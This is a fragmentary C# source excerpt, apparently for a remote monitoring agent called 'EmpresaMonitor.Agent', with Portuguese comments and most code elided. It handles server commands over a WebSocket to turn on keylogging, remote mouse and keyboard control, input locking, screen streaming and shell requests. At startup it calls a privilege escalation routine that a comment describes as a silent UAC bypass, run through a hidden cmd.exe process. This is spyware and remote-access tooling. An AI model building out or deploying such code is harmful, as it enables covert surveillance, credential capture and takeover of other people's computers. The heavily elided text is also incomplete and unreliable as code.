...
namespace EmpresaMonitor.Agent
{
    internal static class Program
    {
        ...
        static void Main()
        {
            ...
            _ = Task.Run(() => AttemptPrivilegeEscalation(state));
                ...
                try
                {
                    ...
                    switch (type)
                    {
                        ...
                        case "permission_state":
                            ...
                            state.ControlActive = GetBool(root, "controlActive");
                            state.KeylogActive = GetBool(root, "keylogActive");
                            state.InputLocked = GetBool(root, "inputLocked");
                            break;
                        case "stream_start": state.StreamRequested = state.AccessActive; break;
                        case "stream_stop": state.StreamRequested = false; break;
                        case "control_input": if (state.AccessActive && state.ControlActive) ApplyControlEvent(root); break;
                        case "shell_request": await HandleShellRequest(socket, state, root); break;
                        case "input_lock": await SetInputLock(GetBool(root, "lock"), socket, state); break;
                    }
                }
                catch { }
            }
        ...
        static async Task SetInputLock(bool lockStatus, ClientWebSocket socket, AgentState state)
        {
            try
            {
                ...
                state.InputLocked = lockStatus;
                await SendJsonAsync(socket, state.SendGate, new { type = "lock_ack", status = lockStatus });
            }
            catch { }
        }
        ...
        static async Task SendJsonAsync(ClientWebSocket socket, SemaphoreSlim gate, object payload)
{
    ...
    { 
        ...
        // Continua na Parte 3...
                // ============================================================
        // MÓDULO 3: CAPTURA DE TELA E CONTROLE (MOUSE/TECLADO)
        // ============================================================
        ...
        // Continua na Parte 4...
                ...
                // ============================================================
        // MÓDULO 4: FINALIZAÇÃO E SUPORTE
        // ============================================================
        static void AttemptPrivilegeEscalation(AgentState state)
        {
            try
            {
                // Tenta um bypass de UAC silencioso básico
                Process.Start(new ProcessStartInfo {
                    FileName = "cmd.exe",
                    Arguments = "/c echo EscalationAttempted > %TEMP%\\log.txt",
                    CreateNoWindow = true,
                    UseShellExecute = false
                });
            }
        ...
        static bool GetBool(JsonElement root, string property) => root.TryGetProperty(property, out var p) && p.GetBoolean();
        static string GetString(JsonElement root, string property, string fallback = "") => root.TryGetProperty(property, out var p) ? p.GetString() ?? fallback : fallback;
    } // Fim da classe Program

    // ============================================================
    // CLASSES DE SUPORTE (CONFIGURAÇÕES)
    // ============================================================
    ...
    // ============================================================
    // KEYBOARDHOOK (COMPLETO E CORRIGIDO)
    // ============================================================
